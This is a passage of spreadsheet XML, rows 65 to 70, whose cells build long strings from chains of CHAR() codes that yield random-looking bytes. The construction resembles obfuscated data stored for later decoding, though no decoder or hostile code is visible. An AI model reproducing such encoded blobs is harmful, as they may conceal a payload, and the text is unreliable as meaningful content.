        <v>fÓž&lt;_x0012_êNÃE`ùSt,&amp;Óð=á\_x0006_¬ü†2&lt;_x0017_jw$Î_x0016_pÌðÜUhüm_x0004_£öÅ_x0001_q_x0003_òöôØ{¬Ï«¥*ñý_x001C_×'ý²	ŒX™,‚Ò2	_x001C_à(çÚJŠ;å_x001F_©&lt;Â_x0002_‘§_x0001_Z2—_x000D_Aô-òKH_’)y	Ê¤A¹ÐaC 9ûÔPª”Ž°·*äcX”Oi,A_x001F_ydÁ	w^_x0007_Æa›_x0001_¼DÛ_x000F_û†Aëâ»_x001F_ÚÃƒÖUqÓÌ_x0019_˜Èæó£ëiËîö+,.I+T&gt;RBíú±_x001F_ ""E¼_x001F_©Ä_x0017_wU2SyÍið…CZ&amp;ÊÚò›*±üß_x001B_ƒ#uôÈî3•d1°†éÕ±ì¢?ÚÂhvTÇ€ÝÏO/Û?ž¸*Ä_</v>
      </c>
      <c r="C65" t="str">
        <f>CHAR(160)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(91)&amp;CHAR(240)&amp;CHAR(119)&amp;CHAR(177)&amp;CHAR(18)&amp;CHAR(192)&amp;CHAR(97)</f>
        <v> ê‘[ðw±_x0012_Àa</v>
      </c>
    </row>
    <row r="66" spans="2:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="B66" t="str">
        <f>CHAR(101)&amp;CHAR(71)&amp;CHAR(98)&amp;CHAR(46)&amp;CHAR(158)&amp;CHAR(27)&amp;CHAR(116)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(138)&amp;CHAR(204)&amp;CHAR(74)&amp;CHAR(15)&amp;CHAR(115)&amp;CHAR(104)&amp;CHAR(126)&amp;CHAR(12)&amp;CHAR(24)&amp;CHAR(35)&amp;CHAR(157)&amp;CHAR(219)&amp;CHAR(144)&amp;CHAR(182)&amp;CHAR(4)&amp;CHAR(187)&amp;CHAR(90)&amp;CHAR(96)&amp;CHAR(26)&amp;CHAR(218)&amp;CHAR(121)&amp;CHAR(69)&amp;CHAR(70)&amp;CHAR(169)&amp;CHAR(191)&amp;CHAR(50)&amp;CHAR(215)&amp;CHAR(29)&amp;CHAR(66)&amp;CHAR(164)&amp;CHAR(114)&amp;CHAR(22)&amp;CHAR(200)&amp;CHAR(176)&amp;CHAR(222)&amp;CHAR(83)&amp;CHAR(186)&amp;CHAR(212)&amp;CHAR(12)&amp;CHAR(73)&amp;CHAR(159)&amp;CHAR(154)&amp;CHAR(245)&amp;CHAR(193)&amp;CHAR(218)&amp;CHAR(92)&amp;CHAR(159)&amp;CHAR(227)&amp;CHAR(76)&amp;CHAR(136)&amp;CHAR(92)&amp;CHAR(134)&amp;CHAR(118)&amp;CHAR(80)&amp;CHAR(41)&amp;CHAR(219)&amp;CHAR(202)&amp;CHAR(135)&amp;CHAR(251)&amp;CHAR(52)&amp;CHAR(242)&amp;CHAR(97)&amp;CHAR(125)&amp;CHAR(244)&amp;CHAR(70)&amp;CHAR(4)&amp;CHAR(248)&amp;CHAR(104)&amp;CHAR(174)&amp;CHAR(67)&amp;CHAR(226)&amp;CHAR(110)&amp;CHAR(151)&amp;CHAR(105)&amp;CHAR(106)&amp;CHAR(117)&amp;CHAR(107)&amp;CHAR(8)&amp;CHAR(116)&amp;CHAR(97)&amp;CHAR(91)&amp;CHAR(32)&amp;CHAR(42)&amp;CHAR(78)&amp;CHAR(102)&amp;CHAR(96)&amp;CHAR(136)&amp;CHAR(205)&amp;CHAR(192)&amp;CHAR(79)&amp;CHAR(168)&amp;CHAR(60)&amp;CHAR(100)&amp;CHAR(223)&amp;CHAR(207)&amp;CHAR(236)&amp;CHAR(63)&amp;CHAR(150)&amp;CHAR(156)&amp;CHAR(68)&amp;CHAR(130)&amp;CHAR(79)&amp;CHAR(143)&amp;CHAR(148)&amp;CHAR(78)&amp;CHAR(221)&amp;CHAR(212)&amp;CHAR(90)&amp;CHAR(105)&amp;CHAR(219)&amp;CHAR(57)&amp;CHAR(193)&amp;CHAR(8)&amp;CHAR(157)&amp;CHAR(160)&amp;CHAR(100)&amp;CHAR(147)&amp;CHAR(81)&amp;CHAR(83)&amp;CHAR(254)&amp;CHAR(26)&amp;CHAR(66)&amp;CHAR(15)&amp;CHAR(104)&amp;CHAR(173)&amp;CHAR(153)&amp;CHAR(113)&amp;CHAR(170)&amp;CHAR(11)&amp;CHAR(125)&amp;CHAR(252)&amp;CHAR(223)&amp;CHAR(51)&amp;CHAR(175)&amp;CHAR(170)&amp;CHAR(156)&amp;CHAR(173)&amp;CHAR(229)&amp;CHAR(225)&amp;CHAR(36)&amp;CHAR(74)&amp;CHAR(233)&amp;CHAR(175)&amp;CHAR(38)&amp;CHAR(102)&amp;CHAR(4)&amp;CHAR(197)&amp;CHAR(204)&amp;CHAR(214)&amp;CHAR(248)&amp;CHAR(184)&amp;CHAR(175)&amp;CHAR(62)&amp;CHAR(24)&amp;CHAR(241)&amp;CHAR(171)&amp;CHAR(26)&amp;CHAR(1)&amp;CHAR(46)&amp;CHAR(126)&amp;CHAR(166)&amp;CHAR(160)&amp;CHAR(60)&amp;CHAR(113)&amp;CHAR(47)&amp;CHAR(41)&amp;CHAR(217)&amp;CHAR(233)&amp;CHAR(125)&amp;CHAR(87)&amp;CHAR(230)&amp;CHAR(12)&amp;CHAR(59)&amp;CHAR(220)&amp;CHAR(249)&amp;CHAR(75)&amp;CHAR(7)&amp;CHAR(162)&amp;CHAR(71)&amp;CHAR(183)&amp;CHAR(186)&amp;CHAR(118)&amp;CHAR(126)&amp;CHAR(52)&amp;CHAR(23)&amp;CHAR(99)&amp;CHAR(219)&amp;CHAR(12)&amp;CHAR(144)&amp;CHAR(13)&amp;CHAR(159)&amp;CHAR(39)&amp;CHAR(204)&amp;CHAR(47)&amp;CHAR(107)&amp;CHAR(164)&amp;CHAR(240)&amp;CHAR(216)&amp;CHAR(235)&amp;CHAR(91)&amp;CHAR(28)&amp;CHAR(2)&amp;CHAR(48)&amp;CHAR(10)&amp;CHAR(215)&amp;CHAR(243)&amp;CHAR(151)&amp;CHAR(63)&amp;CHAR(135)&amp;CHAR(29)&amp;CHAR(212)&amp;CHAR(146)&amp;CHAR(194)&amp;CHAR(62)&amp;CHAR(183)&amp;CHAR(139)&amp;CHAR(7)&amp;CHAR(69)&amp;CHAR(104)&amp;CHAR(86)&amp;CHAR(247)&amp;CHAR(219)&amp;CHAR(142)&amp;CHAR(121)&amp;CHAR(42)&amp;CHAR(8)&amp;CHAR(251)&amp;CHAR(111)&amp;CHAR(255)&amp;CHAR(206)&amp;CHAR(179)&amp;CHAR(49)&amp;CHAR(5)&amp;CHAR(219)&amp;CHAR(167)&amp;CHAR(154)&amp;CHAR(76)&amp;CHAR(151)&amp;CHAR(119)&amp;CHAR(225)&amp;CHAR(129)&amp;CHAR(142)&amp;CHAR(126)&amp;CHAR(151)&amp;CHAR(150)&amp;CHAR(121)</f>
        <v>eGb.ž_x001B_t»ëŠÌJ_x000F_sh~_x000C__x0018_#Û¶_x0004_»Z`_x001A_ÚyEF©¿2×_x001D_B¤r_x0016_È°ÞSºÔ_x000C_IŸšõÁÚ\ŸãLˆ\†vP)ÛÊ‡û4òa}ôF_x0004_øh®Cân—ijuk_x0008_ta[ *Nf`ˆÍÀO¨&lt;dßÏì?–œD‚O”NÝÔZiÛ9Á_x0008_ d“QSþ_x001A_B_x000F_h­™qª_x000B_}üß3¯ªœ­åá$Jé¯&amp;f_x0004_ÅÌÖø¸¯&gt;_x0018_ñ«_x001A__x0001_.~¦ &lt;q/)Ùé}Wæ_x000C_;ÜùK_x0007_¢G·ºv~4_x0017_cÛ_x000C__x000D_Ÿ'Ì/k¤ðØë[_x001C__x0002_0
×ó—?‡_x001D_Ô’Â&gt;·‹_x0007_EhV÷ÛŽy*_x0008_ûoÿÎ³1_x0005_Û§šL—wáŽ~—–y</v>
      </c>
      <c r="C66" t="str">
        <f>CHAR(145)&amp;CHAR(19)&amp;CHAR(51)&amp;CHAR(244)&amp;CHAR(20)&amp;CHAR(50)&amp;CHAR(3)&amp;CHAR(254)&amp;CHAR(180)&amp;CHAR(115)</f>
        <v>‘_x0013_3ô_x0014_2_x0003_þ´s</v>
      </c>
    </row>
    <row r="67" spans="2:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="B67" t="str">
        <f>CHAR(225)&amp;CHAR(16)&amp;CHAR(83)&amp;CHAR(45)&amp;CHAR(99)&amp;CHAR(99)&amp;CHAR(116)&amp;CHAR(211)&amp;CHAR(11)&amp;CHAR(151)&amp;CHAR(227)&amp;CHAR(212)&amp;CHAR(48)&amp;CHAR(110)&amp;CHAR(35)&amp;CHAR(84)&amp;CHAR(234)&amp;CHAR(46)&amp;CHAR(105)&amp;CHAR(72)&amp;CHAR(27)&amp;CHAR(112)&amp;CHAR(68)&amp;CHAR(118)&amp;CHAR(121)&amp;CHAR(185)&amp;CHAR(88)&amp;CHAR(53)&amp;CHAR(106)&amp;CHAR(145)&amp;CHAR(151)&amp;CHAR(186)&amp;CHAR(212)&amp;CHAR(11)&amp;CHAR(143)&amp;CHAR(100)&amp;CHAR(45)&amp;CHAR(45)&amp;CHAR(215)&amp;CHAR(74)&amp;CHAR(192)&amp;CHAR(235)&amp;CHAR(184)&amp;CHAR(117)&amp;CHAR(29)&amp;CHAR(41)&amp;CHAR(79)&amp;CHAR(50)&amp;CHAR(21)&amp;CHAR(123)&amp;CHAR(29)&amp;CHAR(248)&amp;CHAR(176)&amp;CHAR(216)&amp;CHAR(5)&amp;CHAR(167)&amp;CHAR(172)&amp;CHAR(84)&amp;CHAR(199)&amp;CHAR(5)&amp;CHAR(103)&amp;CHAR(107)&amp;CHAR(68)&amp;CHAR(22)&amp;CHAR(39)&amp;CHAR(109)&amp;CHAR(59)&amp;CHAR(70)&amp;CHAR(201)&amp;CHAR(150)&amp;CHAR(216)&amp;CHAR(174)&amp;CHAR(191)&amp;CHAR(242)&amp;CHAR(247)&amp;CHAR(229)&amp;CHAR(226)&amp;CHAR(177)&amp;CHAR(59)&amp;CHAR(49)&amp;CHAR(130)&amp;CHAR(28)&amp;CHAR(68)&amp;CHAR(41)&amp;CHAR(113)&amp;CHAR(147)&amp;CHAR(197)&amp;CHAR(12)&amp;CHAR(123)&amp;CHAR(30)&amp;CHAR(230)&amp;CHAR(195)&amp;CHAR(85)&amp;CHAR(209)&amp;CHAR(7)&amp;CHAR(32)&amp;CHAR(145)&amp;CHAR(100)&amp;CHAR(42)&amp;CHAR(88)&amp;CHAR(82)&amp;CHAR(131)&amp;CHAR(122)&amp;CHAR(8)&amp;CHAR(176)&amp;CHAR(28)&amp;CHAR(47)&amp;CHAR(163)&amp;CHAR(108)&amp;CHAR(155)&amp;CHAR(96)&amp;CHAR(133)&amp;CHAR(125)&amp;CHAR(89)&amp;CHAR(1)&amp;CHAR(76)&amp;CHAR(61)&amp;CHAR(92)&amp;CHAR(108)&amp;CHAR(210)&amp;CHAR(97)&amp;CHAR(226)&amp;CHAR(241)&amp;CHAR(7)&amp;CHAR(7)&amp;CHAR(121)&amp;CHAR(3)&amp;CHAR(50)&amp;CHAR(183)&amp;CHAR(64)&amp;CHAR(60)&amp;CHAR(218)&amp;CHAR(51)&amp;CHAR(131)&amp;CHAR(40)&amp;CHAR(137)&amp;CHAR(210)&amp;CHAR(122)&amp;CHAR(30)&amp;CHAR(33)&amp;CHAR(51)&amp;CHAR(83)&amp;CHAR(181)&amp;CHAR(142)&amp;CHAR(60)&amp;CHAR(237)&amp;CHAR(131)&amp;CHAR(60)&amp;CHAR(185)&amp;CHAR(244)&amp;CHAR(68)&amp;CHAR(141)&amp;CHAR(216)&amp;CHAR(90)&amp;CHAR(123)&amp;CHAR(110)&amp;CHAR(92)&amp;CHAR(37)&amp;CHAR(218)&amp;CHAR(220)&amp;CHAR(100)&amp;CHAR(251)&amp;CHAR(147)&amp;CHAR(97)&amp;CHAR(242)&amp;CHAR(188)&amp;CHAR(142)&amp;CHAR(41)&amp;CHAR(182)&amp;CHAR(83)&amp;CHAR(149)&amp;CHAR(61)&amp;CHAR(245)&amp;CHAR(222)&amp;CHAR(3)&amp;CHAR(141)&amp;CHAR(39)&amp;CHAR(131)&amp;CHAR(141)&amp;CHAR(194)&amp;CHAR(134)&amp;CHAR(92)&amp;CHAR(6)&amp;CHAR(158)&amp;CHAR(116)&amp;CHAR(231)&amp;CHAR(26)&amp;CHAR(245)&amp;CHAR(33)&amp;CHAR(147)&amp;CHAR(85)&amp;CHAR(175)&amp;CHAR(37)&amp;CHAR(77)&amp;CHAR(55)&amp;CHAR(211)&amp;CHAR(158)&amp;CHAR(231)&amp;CHAR(151)&amp;CHAR(31)&amp;CHAR(132)&amp;CHAR(133)&amp;CHAR(87)&amp;CHAR(207)&amp;CHAR(202)&amp;CHAR(5)&amp;CHAR(233)&amp;CHAR(89)&amp;CHAR(121)&amp;CHAR(21)&amp;CHAR(236)&amp;CHAR(138)&amp;CHAR(159)&amp;CHAR(132)&amp;CHAR(250)&amp;CHAR(223)&amp;CHAR(202)&amp;CHAR(54)&amp;CHAR(85)&amp;CHAR(89)&amp;CHAR(244)&amp;CHAR(167)&amp;CHAR(141)&amp;CHAR(27)&amp;CHAR(239)&amp;CHAR(162)&amp;CHAR(222)&amp;CHAR(146)&amp;CHAR(202)&amp;CHAR(128)&amp;CHAR(152)&amp;CHAR(214)&amp;CHAR(209)&amp;CHAR(215)&amp;CHAR(2)&amp;CHAR(95)&amp;CHAR(122)&amp;CHAR(1)&amp;CHAR(68)&amp;CHAR(192)&amp;CHAR(4)&amp;CHAR(243)&amp;CHAR(194)&amp;CHAR(244)&amp;CHAR(197)&amp;CHAR(88)&amp;CHAR(236)&amp;CHAR(227)&amp;CHAR(36)&amp;CHAR(12)&amp;CHAR(81)&amp;CHAR(90)&amp;CHAR(237)&amp;CHAR(85)&amp;CHAR(251)</f>
        <v>á_x0010_S-cctÓ_x000B_—ãÔ0n#Tê.iH_x001B_pDvy¹X5j‘—ºÔ_x000B_d--×JÀë¸u_x001D_)O2_x0015_{_x001D_ø°Ø_x0005_§¬TÇ_x0005_gkD_x0016_'m;FÉ–Ø®¿ò÷åâ±;1‚_x001C_D)q“Å_x000C_{_x001E_æÃUÑ_x0007_ ‘d*XRƒz_x0008_°_x001C_/£l›`…}Y_x0001_L=\lÒaâñ_x0007__x0007_y_x0003_2·@&lt;Ú3ƒ(‰Òz_x001E_!3SµŽ&lt;íƒ&lt;¹ôDØZ{n\%ÚÜdû“aò¼Ž)¶S•=õÞ_x0003_'ƒÂ†\_x0006_žtç_x001A_õ!“U¯%M7Óžç—_x001F_„…WÏÊ_x0005_éYy_x0015_ìŠŸ„úßÊ6UYô§_x001B_ï¢Þ’Ê€˜ÖÑ×_x0002__z_x0001_DÀ_x0004_óÂôÅXìã$_x000C_QZíUû</v>
      </c>
      <c r="C67" t="str">
        <f>CHAR(184)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(50)&amp;CHAR(11)&amp;CHAR(40)&amp;CHAR(225)&amp;CHAR(62)&amp;CHAR(240)&amp;CHAR(127)</f>
        <v>¸ôq2_x000B_(á&gt;ð</v>
      </c>
    </row>
    <row r="68" spans="2:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="B68" t="str">
        <f>CHAR(5)&amp;CHAR(248)&amp;CHAR(41)&amp;CHAR(178)&amp;CHAR(180)&amp;CHAR(103)&amp;CHAR(118)&amp;CHAR(2)&amp;CHAR(242)&amp;CHAR(60)&amp;CHAR(133)&amp;CHAR(132)&amp;CHAR(124)&amp;CHAR(207)&amp;CHAR(138)&amp;CHAR(9)&amp;CHAR(114)&amp;CHAR(215)&amp;CHAR(81)&amp;CHAR(28)&amp;CHAR(231)&amp;CHAR(158)&amp;CHAR(145)&amp;CHAR(216)&amp;CHAR(144)&amp;CHAR(237)&amp;CHAR(166)&amp;CHAR(15)&amp;CHAR(44)&amp;CHAR(91)&amp;CHAR(80)&amp;CHAR(10)&amp;CHAR(238)&amp;CHAR(230)&amp;CHAR(144)&amp;CHAR(64)&amp;CHAR(205)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(164)&amp;CHAR(149)&amp;CHAR(143)&amp;CHAR(102)&amp;CHAR(63)&amp;CHAR(1)&amp;CHAR(242)&amp;CHAR(216)&amp;CHAR(55)&amp;CHAR(23)&amp;CHAR(161)&amp;CHAR(127)&amp;CHAR(44)&amp;CHAR(122)&amp;CHAR(69)&amp;CHAR(152)&amp;CHAR(110)&amp;CHAR(27)&amp;CHAR(50)&amp;CHAR(224)&amp;CHAR(211)&amp;CHAR(28)&amp;CHAR(40)&amp;CHAR(140)&amp;CHAR(178)&amp;CHAR(123)&amp;CHAR(129)&amp;CHAR(16)&amp;CHAR(37)&amp;CHAR(5)&amp;CHAR(190)&amp;CHAR(3)&amp;CHAR(126)&amp;CHAR(89)&amp;CHAR(241)&amp;CHAR(133)&amp;CHAR(241)&amp;CHAR(122)&amp;CHAR(247)&amp;CHAR(164)&amp;CHAR(17)&amp;CHAR(240)&amp;CHAR(123)&amp;CHAR(106)&amp;CHAR(252)&amp;CHAR(57)&amp;CHAR(112)&amp;CHAR(22)&amp;CHAR(207)&amp;CHAR(149)&amp;CHAR(14)&amp;CHAR(171)&amp;CHAR(124)&amp;CHAR(202)&amp;CHAR(184)&amp;CHAR(104)&amp;CHAR(13)&amp;CHAR(15)&amp;CHAR(98)&amp;CHAR(8)&amp;CHAR(22)&amp;CHAR(171)&amp;CHAR(89)&amp;CHAR(222)&amp;CHAR(72)&amp;CHAR(173)&amp;CHAR(208)&amp;CHAR(108)&amp;CHAR(53)&amp;CHAR(172)&amp;CHAR(194)&amp;CHAR(153)&amp;CHAR(96)&amp;CHAR(194)&amp;CHAR(220)&amp;CHAR(109)&amp;CHAR(195)&amp;CHAR(231)&amp;CHAR(50)&amp;CHAR(216)&amp;CHAR(132)&amp;CHAR(73)&amp;CHAR(26)&amp;CHAR(37)&amp;CHAR(80)&amp;CHAR(195)&amp;CHAR(38)&amp;CHAR(238)&amp;CHAR(75)&amp;CHAR(178)&amp;CHAR(173)&amp;CHAR(206)&amp;CHAR(81)&amp;CHAR(104)&amp;CHAR(88)&amp;CHAR(232)&amp;CHAR(255)&amp;CHAR(175)&amp;CHAR(31)&amp;CHAR(217)&amp;CHAR(251)&amp;CHAR(126)&amp;CHAR(31)&amp;CHAR(89)&amp;CHAR(23)&amp;CHAR(225)&amp;CHAR(154)&amp;CHAR(219)&amp;CHAR(94)&amp;CHAR(33)&amp;CHAR(99)&amp;CHAR(91)&amp;CHAR(191)&amp;CHAR(163)&amp;CHAR(101)&amp;CHAR(91)&amp;CHAR(41)&amp;CHAR(171)&amp;CHAR(61)&amp;CHAR(154)&amp;CHAR(30)&amp;CHAR(161)&amp;CHAR(160)&amp;CHAR(140)&amp;CHAR(46)&amp;CHAR(71)&amp;CHAR(242)&amp;CHAR(82)&amp;CHAR(197)&amp;CHAR(21)&amp;CHAR(177)&amp;CHAR(7)&amp;CHAR(247)&amp;CHAR(156)&amp;CHAR(145)&amp;CHAR(24)&amp;CHAR(40)&amp;CHAR(140)&amp;CHAR(171)&amp;CHAR(38)&amp;CHAR(162)&amp;CHAR(126)&amp;CHAR(210)&amp;CHAR(65)&amp;CHAR(229)&amp;CHAR(117)&amp;CHAR(152)&amp;CHAR(247)&amp;CHAR(47)&amp;CHAR(112)&amp;CHAR(108)&amp;CHAR(201)&amp;CHAR(122)&amp;CHAR(132)&amp;CHAR(131)&amp;CHAR(185)&amp;CHAR(17)&amp;CHAR(189)&amp;CHAR(170)&amp;CHAR(183)&amp;CHAR(228)&amp;CHAR(230)&amp;CHAR(181)&amp;CHAR(162)&amp;CHAR(45)&amp;CHAR(63)&amp;CHAR(189)&amp;CHAR(173)&amp;CHAR(226)&amp;CHAR(176)&amp;CHAR(18)&amp;CHAR(197)&amp;CHAR(50)&amp;CHAR(50)&amp;CHAR(30)&amp;CHAR(174)&amp;CHAR(111)&amp;CHAR(96)&amp;CHAR(164)&amp;CHAR(86)&amp;CHAR(219)&amp;CHAR(20)&amp;CHAR(129)&amp;CHAR(108)&amp;CHAR(84)&amp;CHAR(86)&amp;CHAR(79)&amp;CHAR(232)&amp;CHAR(24)&amp;CHAR(238)&amp;CHAR(163)&amp;CHAR(29)&amp;CHAR(9)&amp;CHAR(66)&amp;CHAR(29)&amp;CHAR(181)&amp;CHAR(152)&amp;CHAR(162)&amp;CHAR(174)&amp;CHAR(147)&amp;CHAR(29)&amp;CHAR(212)&amp;CHAR(127)&amp;CHAR(240)&amp;CHAR(193)&amp;CHAR(101)&amp;CHAR(74)&amp;CHAR(78)&amp;CHAR(78)&amp;CHAR(213)&amp;CHAR(189)&amp;CHAR(206)&amp;CHAR(61)&amp;CHAR(115)&amp;CHAR(131)&amp;CHAR(210)</f>
        <v>_x0005_ø)²´gv_x0002_ò&lt;…„|ÏŠ	r×Q_x001C_çž‘Øí¦_x000F_,[P
îæ@Í_x0005__x000B_¤•f?_x0001_òØ7_x0017_¡,zE˜n_x001B_2àÓ_x001C_(Œ²{_x0010_%_x0005_¾_x0003_~Yñ…ñz÷¤_x0011_ð{jü9p_x0016_Ï•_x000E_«|Ê¸h_x000D__x000F_b_x0008__x0016_«YÞH­Ðl5¬Â™`ÂÜmÃç2Ø„I_x001A_%PÃ&amp;îK²­ÎQhXèÿ¯_x001F_Ùû~_x001F_Y_x0017_ášÛ^!c[¿£e[)«=š_x001E_¡ Œ.GòRÅ_x0015_±_x0007_÷œ‘_x0018_(Œ«&amp;¢~ÒAåu˜÷/plÉz„ƒ¹_x0011_½ª·äæµ¢-?½­â°_x0012_Å22_x001E_®o`¤VÛ_x0014_lTVOè_x0018_î£_x001D_	B_x001D_µ˜¢®“_x001D_ÔðÁeJNNÕ½Î=sƒÒ</v>
      </c>
      <c r="C68" t="str">
        <f>CHAR(125)&amp;CHAR(95)&amp;CHAR(160)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(91)&amp;CHAR(240)&amp;CHAR(119)&amp;CHAR(176)&amp;CHAR(18)</f>
        <v>}_ ê‘[ðw°_x0012_</v>
      </c>
    </row>
    <row r="69" spans="2:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="B69" t="str">
        <f>CHAR(101)&amp;CHAR(96)&amp;CHAR(202)&amp;CHAR(41)&amp;CHAR(65)&amp;CHAR(5)&amp;CHAR(213)&amp;CHAR(191)&amp;CHAR(211)&amp;CHAR(225)&amp;CHAR(13)&amp;CHAR(78)&amp;CHAR(125)&amp;CHAR(213)&amp;CHAR(16)&amp;CHAR(204)&amp;CHAR(17)&amp;CHAR(244)&amp;CHAR(185)&amp;CHAR(17)&amp;CHAR(44)&amp;CHAR(68)&amp;CHAR(178)&amp;CHAR(96)&amp;CHAR(86)&amp;CHAR(148)&amp;CHAR(149)&amp;CHAR(70)&amp;CHAR(167)&amp;CHAR(185)&amp;CHAR(220)&amp;CHAR(40)&amp;CHAR(251)&amp;CHAR(62)&amp;CHAR(218)&amp;CHAR(175)&amp;CHAR(221)&amp;CHAR(48)&amp;CHAR(240)&amp;CHAR(104)&amp;CHAR(73)&amp;CHAR(241)&amp;CHAR(234)&amp;CHAR(132)&amp;CHAR(204)&amp;CHAR(182)&amp;CHAR(117)&amp;CHAR(47)&amp;CHAR(3)&amp;CHAR(121)&amp;CHAR(252)&amp;CHAR(156)&amp;CHAR(142)&amp;CHAR(165)&amp;CHAR(52)&amp;CHAR(26)&amp;CHAR(204)&amp;CHAR(68)&amp;CHAR(190)&amp;CHAR(142)&amp;CHAR(189)&amp;CHAR(221)&amp;CHAR(176)&amp;CHAR(114)&amp;CHAR(53)&amp;CHAR(115)&amp;CHAR(202)&amp;CHAR(167)&amp;CHAR(231)&amp;CHAR(76)&amp;CHAR(161)&amp;CHAR(70)&amp;CHAR(8)&amp;CHAR(148)&amp;CHAR(131)&amp;CHAR(95)&amp;CHAR(167)&amp;CHAR(241)&amp;CHAR(58)&amp;CHAR(242)&amp;CHAR(238)&amp;CHAR(76)&amp;CHAR(60)&amp;CHAR(207)&amp;CHAR(234)&amp;CHAR(185)&amp;CHAR(96)&amp;CHAR(113)&amp;CHAR(61)&amp;CHAR(107)&amp;CHAR(103)&amp;CHAR(171)&amp;CHAR(84)&amp;CHAR(238)&amp;CHAR(208)&amp;CHAR(135)&amp;CHAR(141)&amp;CHAR(234)&amp;CHAR(189)&amp;CHAR(74)&amp;CHAR(34)&amp;CHAR(169)&amp;CHAR(140)&amp;CHAR(91)&amp;CHAR(136)&amp;CHAR(54)&amp;CHAR(34)&amp;CHAR(74)&amp;CHAR(133)&amp;CHAR(237)&amp;CHAR(37)&amp;CHAR(222)&amp;CHAR(222)&amp;CHAR(14)&amp;CHAR(46)&amp;CHAR(175)&amp;CHAR(251)&amp;CHAR(55)&amp;CHAR(49)&amp;CHAR(227)&amp;CHAR(203)&amp;CHAR(4)&amp;CHAR(208)&amp;CHAR(55)&amp;CHAR(99)&amp;CHAR(127)&amp;CHAR(254)&amp;CHAR(15)&amp;CHAR(246)&amp;CHAR(171)&amp;CHAR(138)&amp;CHAR(79)&amp;CHAR(129)&amp;CHAR(16)&amp;CHAR(96)&amp;CHAR(60)&amp;CHAR(56)&amp;CHAR(68)&amp;CHAR(228)&amp;CHAR(2)&amp;CHAR(13)&amp;CHAR(23)&amp;CHAR(245)&amp;CHAR(49)&amp;CHAR(5)&amp;CHAR(63)&amp;CHAR(48)&amp;CHAR(211)&amp;CHAR(147)&amp;CHAR(236)&amp;CHAR(41)&amp;CHAR(241)&amp;CHAR(155)&amp;CHAR(81)&amp;CHAR(45)&amp;CHAR(133)&amp;CHAR(166)&amp;CHAR(199)&amp;CHAR(147)&amp;CHAR(1)&amp;CHAR(180)&amp;CHAR(125)&amp;CHAR(193)&amp;CHAR(216)&amp;CHAR(92)&amp;CHAR(25)&amp;CHAR(116)&amp;CHAR(87)&amp;CHAR(52)&amp;CHAR(144)&amp;CHAR(94)&amp;CHAR(28)&amp;CHAR(87)&amp;CHAR(152)&amp;CHAR(68)&amp;CHAR(245)&amp;CHAR(146)&amp;CHAR(231)&amp;CHAR(37)&amp;CHAR(113)&amp;CHAR(105)&amp;CHAR(148)&amp;CHAR(103)&amp;CHAR(67)&amp;CHAR(41)&amp;CHAR(77)&amp;CHAR(186)&amp;CHAR(92)&amp;CHAR(198)&amp;CHAR(200)&amp;CHAR(12)&amp;CHAR(82)&amp;CHAR(214)&amp;CHAR(193)&amp;CHAR(179)&amp;CHAR(107)&amp;CHAR(94)&amp;CHAR(132)&amp;CHAR(156)&amp;CHAR(143)&amp;CHAR(79)&amp;CHAR(168)&amp;CHAR(115)&amp;CHAR(116)&amp;CHAR(206)&amp;CHAR(201)&amp;CHAR(253)&amp;CHAR(241)&amp;CHAR(30)&amp;CHAR(119)&amp;CHAR(138)&amp;CHAR(132)&amp;CHAR(150)&amp;CHAR(1)&amp;CHAR(238)&amp;CHAR(54)&amp;CHAR(152)&amp;CHAR(95)&amp;CHAR(62)&amp;CHAR(65)&amp;CHAR(170)&amp;CHAR(24)&amp;CHAR(40)&amp;CHAR(146)&amp;CHAR(55)&amp;CHAR(122)&amp;CHAR(60)&amp;CHAR(221)&amp;CHAR(151)&amp;CHAR(239)&amp;CHAR(201)&amp;CHAR(85)&amp;CHAR(133)&amp;CHAR(244)&amp;CHAR(108)&amp;CHAR(4)&amp;CHAR(201)&amp;CHAR(141)&amp;CHAR(224)&amp;CHAR(59)&amp;CHAR(235)&amp;CHAR(245)&amp;CHAR(176)&amp;CHAR(221)&amp;CHAR(126)&amp;CHAR(27)&amp;CHAR(160)&amp;CHAR(69)&amp;CHAR(232)&amp;CHAR(238)&amp;CHAR(74)&amp;CHAR(16)&amp;CHAR(31)&amp;CHAR(175)&amp;CHAR(114)</f>
        <v>e`Ê)A_x0005_Õ¿Óá_x000D_N}Õ_x0010_Ì_x0011_ô¹_x0011_,D²`V”•F§¹Ü(û&gt;Ú¯Ý0ðhIñê„Ì¶u/_x0003_yüœŽ¥4_x001A_ÌD¾Ž½Ý°r5sÊ§çL¡F_x0008_”ƒ_§ñ:òîL&lt;Ïê¹`q=kg«TîÐ‡ê½J"©Œ[ˆ6"J…í%ÞÞ_x000E_.¯û71ãË_x0004_Ð7cþ_x000F_ö«ŠO_x0010_`&lt;8Dä_x0002__x000D__x0017_õ1_x0005_?0Ó“ì)ñ›Q-…¦Ç“_x0001_´}ÁØ\_x0019_tW4^_x001C_W˜Dõ’ç%qi”gC)Mº\ÆÈ_x000C_RÖÁ³k^„œO¨stÎÉýñ_x001E_wŠ„–_x0001_î6˜_&gt;Aª_x0018_(’7z&lt;Ý—ïÉU…ôl_x0004_Éà;ëõ°Ý~_x001B_ EèîJ_x0010__x001F_¯r</v>
      </c>
      <c r="C69" t="str">
        <f>CHAR(192)&amp;CHAR(97)&amp;CHAR(152)&amp;CHAR(164)&amp;CHAR(232)&amp;CHAR(156)&amp;CHAR(244)&amp;CHAR(186)&amp;CHAR(135)&amp;CHAR(111)</f>
        <v>Àa˜¤èœôº‡o</v>
      </c>
    </row>
    <row r="70" spans="2:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="B70" t="str">
